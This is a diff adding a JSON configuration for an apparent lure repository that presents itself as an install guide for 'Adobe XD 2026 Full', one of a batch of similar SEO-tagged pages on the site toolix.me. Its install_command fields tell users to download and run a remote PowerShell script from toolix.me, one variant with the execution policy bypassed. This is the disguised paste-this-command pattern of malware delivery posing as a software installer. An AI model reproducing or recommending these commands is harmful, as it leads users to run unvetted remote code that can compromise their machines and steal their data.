@@ -1,0 +1,28 @@
+{
+  "repo": "Adobe-XD-2026-Full",
+  "product": "Adobe XD 2026 Full",
+  "product_title": "Adobe XD 2026",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "creative",
+  "topics": [
+    "how-to-install-adobe-xd",
+    "adobe-xd-app",
+    "creative-workflow",
+    "visual-design",
+    "design-software",
+    "image-editing",
+    "adobe-xd-creative-tool",
+    "adobe-xd-design-tool",
+    "adobe-xd",
+    "adobe-xd-desktop-2026",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
